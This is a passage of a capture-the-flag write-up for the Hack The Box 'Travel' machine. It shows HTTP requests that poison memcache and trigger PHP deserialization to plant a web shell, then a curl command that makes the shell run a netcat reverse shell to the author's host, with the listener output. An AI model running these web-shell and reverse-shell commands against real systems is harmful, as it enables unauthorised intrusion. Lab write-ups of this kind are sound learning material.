Host: blog.travel.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1

```

2. Chek *debug.php* to see if mencache was poised

<img src="/home/pwndumb/Documents/cyber-notes/dumbx90.github.io/assets/img/commons/hackthebox/travel/webshel-injected_serialization_php.png" alt="webshel-injected_serialization_php" style="zoom:75%;" />

3. Send another request to the same page of hash I discovered in the #understanding the name topic. This will trigger the deserialization and  create w web-shell named *dumb.php*

   ```php
   GET /awesome-rss/?custom_feed_url=http://10.10.14.26/feedmy.xml HTTP/1.1
   Host: blog.travel.htb
   User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
   Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
   Accept-Language: en-US,en;q=0.5
   Accept-Encoding: gzip, deflate
   Connection: close
   Upgrade-Insecure-Requests: 1
   ```

4.  Send a request to location of web-shell:

<img src="/home/pwndumb/Documents/cyber-notes/dumbx90.github.io/assets/img/commons/hackthebox/travel/shell-OK.png" alt="shell-OK" style="zoom:75%;" />

> I don't know why put this hole process has to be fast and less than 60 seconds, in fact, I don't  know too if this affirmation is true. 

<img src="/home/pwndumb/Documents/cyber-notes/dumbx90.github.io/assets/img/commons/hackthebox/travel/web-shell-whoami.png" alt="web-shell-whoami" style="zoom:75%;" />

### Reverse Shell 

Send the command below in my terminal after started a *netcat* listener a receive I receive the reverse shell:

```bash
curl -i -s -k -X $'POST' --data-binary 'dumb=nc 10.10.14.26 4242 -e /bin/bash' 'http://blog.travel.htb/wp-content/themes/twentytwenty/logs/dumb.php'
```

```bash
nc -nlvp 4242
Listening on 0.0.0.0 4242
Connection received on 10.10.10.189 56296
cat /etc/hostname
blog
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```



## Priv Escalation 



## Tools used in this post

- Burp Suite

- Hascat

- https://mybrowseraddon.com/modify-header-value.html

  

## Terminal Customization 

- https://eugeny.github.io/terminus/

- https://ohmyz.sh/ (afowler theme)

- https://github.com/samoshkin/tmux-config

  

## Reference Links

- http://securityidiots.com/Web-Pentest/SQL-Injection/Part-1-Basic-of-SQL-for-SQLi.html
- https://ctf101.org/web-exploitation/sql-injection/what-is-sql-injection/
- https://portswigger.net/web-security/sql-injection/cheat-sheet

- https://dev.mysql.com/doc/refman/8.0/en/information-schema.html

- https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/

- https://sec-consult.com/en/blog/2019/04/windows-privilege-escalation-an-approach-for-penetration-testers/

  